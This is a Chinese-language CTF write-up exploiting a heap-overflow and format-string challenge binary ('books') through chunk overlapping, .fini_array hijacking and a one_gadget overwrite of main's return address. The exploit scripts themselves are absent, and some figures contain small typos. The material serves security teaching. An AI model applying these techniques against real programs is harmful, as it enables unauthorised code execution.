来看反编译：

可以看到，这个题目所有的堆块大小都是硬编码的，不存在动态分配内存。其中的edit_order选项是本题的输入函数：

这个函数存在严重的溢出漏洞，它仅检查换行符\n(10)，并没有限制输入长度，也就是说我们可以向目标内存输入任意字节的数据，在这里就构成了堆溢出。

另外一个重要的漏洞就是 printf(_dest) 处的格式化字符串漏洞，下面详细讲述漏洞利用过程。

二、调试

前言

本题最终利用依然是修改GOT表项，通过free(ptr)触发system(/bin/sh)。checksec查看程序保护没有开启PIE和RELRO。

首要目标依然是泄露libc基址来得到system真实地址。本题明显可以通过堆溢出布置 _dest块再用格式化字符串泄露地址，不过这里存在一个很大的障碍：执行完 printf( _dest)后程序会正常退出，也就是说即使泄露了地址也无法修改GOT表项。所以这里就引出了本篇的主题：.fini_array劫持。

.fini_array 是一个函数指针数组，它的作用很简单：当程序通过 exit() 或 return 0 正常退出时，会依次调用这个数组里存放的所有函数指针。在正常程序中，它主要被用来执行清理工作，比如调用C++全局对象的析构函数，或者执行那些用 __attribute__((destructor)) 标记的自定义清理函数。

只要我们修改 .fini_array 数组里的指针为 main 函数地址，每次结束时程序又会返回执行 main，触发循环。

.fini_array 数组存在于程序的 .data 段中，可以通过 readelf 看到它：

输出：

➜ /ctf readelf -S books | grep .fini_array
[20] .fini_array FINI_ARRAY 0000000000 000021b8

在IDA中找到对应地址。Segment permissions: Read/Write表示此处可读可写，是本题漏洞利用的基础。dq offset sub_400830表示在地址 0x6011B8 处，存放着一个8字节的函数指针(是__do_global_dtors_aux 函数，用于执行全局析构(不重要))，这个就是我们要修改的指针。

第一步：控制 _dest 堆块

一开始本人看到这里认为简单的堆溢出就可以控制 _dest，不过，根据下面截取的部分分支代码，可以看到在编辑 order 之后会有一个 strcpy 函数向 _dest 写入数据，即使 order2 溢出到了 _dest，依然会被覆写。

分析程序，在 submit 之前分配了三个0x80的堆块，submit选项后又会分配一个0x140的堆块，于是思考通过构造 chunk overlapping 再次覆写 _dest 区域。

思路(需调整)：order1 堆块溢出修改 order2 堆块的 size 域为0x151，再通过 delete 选项 free 掉 order2，于是 submit 选项分配的0x140堆块会重叠所有 order2 区域以及部分 _dest 区域，在这个部分 _dest 区域就可以布置格式化字符串。如图所示。

实际调试过程中发现，如果先溢出覆写size再free会触发double free错误(还没看出为什么)，所以更稳妥的方式是先 free 掉 order2 再溢出覆写 size。现阶段exp：

输出：

Order 1: 1111
Order 2: Order 1: 1111
Order 2:
Your order is submitted!
[*] Process ‘./books’ stopped with exit code 0 (pid 476)

这个输出很好的验证了我们的思路，演绎一下这里的输出：造成堆块重叠后，程序向新分配的0x140堆块区域拼接 order1 和 order2，实际上是在 order2 区域输入拼接的数据，程序首先输入了”Order 1: “和 order1 区域内容，再输入”Order 2: “，之后寻找 order2 的内容，发现它正好是之前输入的”Order 1: 1111\nOrder 2: “，于是又把这些输入进去，造成如上输出。

当然，很明显这里并没有覆盖到 _dest 区域，不过有了上面这些理论验证，我们只需要调整 order1 输入的数据即可覆盖到 _dest 。

这里需要计算一下，已知 submit 堆块覆盖全部 order2 区域，要覆盖 _dest 需要填充0x80的 order2 区域以及0x10的 _dest 元数据，共 144 字节。根据上面的输出结果，必然会出现”Order 1: “和”\nOrder 2: Order 1: “，算上空格和换行符共 28 字节，所以说我们需要在 order1 输入format string + padding = 144-28 = 116字节。

第三步：劫持GOT触发system(/bin/sh)

思路一(不可行)：

这里我一开始想的是劫持GOT触发system(/bin/sh)，但是之前讲到由于栈布局混乱第二次submit不会回到main函数，即使我们修改了GOT表项也无法通过 free 触发 system(/bin/sh)。

思路二(可能可行)：

当时还想过修改main函数的返回地址控制程序流，不过要修改多个地址，使用格式化字符串修改并布置ROP链不太现实(太麻烦)。

思路三(不可行)：

这里又想到开头分支处的 fgets 选项，之前我们通过 fgets 读取的0x80字节将.fini_array地址放到了栈上，所以我们也可以通过 fgets 在栈上预先布置好一些控制流指针，然后修改main函数的返回地址到这些控制流指针处。不过呢，因为这个ROP链不在栈顶，并且无法控制rsp指针到ROP链处，这种方法还是放弃了。

思路四(getshll)：

最后还是得用one_gadget，这里我的环境是 glibc 2.23，因为之前有的环境one_gadget打不通，所以作为一种最后手段。这里环境可以使用one_gadget

我们依然使用多个%p来探测，发现在第28个参数的位置存在一个栈地址，调试如下：

我们继续执行到第二个submit之后main函数的ret处，这里的栈顶就是返回地址，计算一下0x7ffc33di4b00-0x7ffc33d14948 = 440，多次运行发现这个偏移是固定的。

另提一嘴，从BACKTRACE也可以看到为什么这里劫持.fini_array并不能造成循环：第一次的ret会返回到__ libc_start_main+232，但是 __libc_start_main里调用的一些函数会留在BACKTRACE里，第二次ret直接进入 _dl_fini+455，跳过了.fini _array 的检查。

于是我们在第一个submit时候，就可以泄露返回地址的位置。

之后使用 fmt 将one_gadget覆写返回地址即可。pwntools工具生成不准确，还是手动构造更清晰可靠。
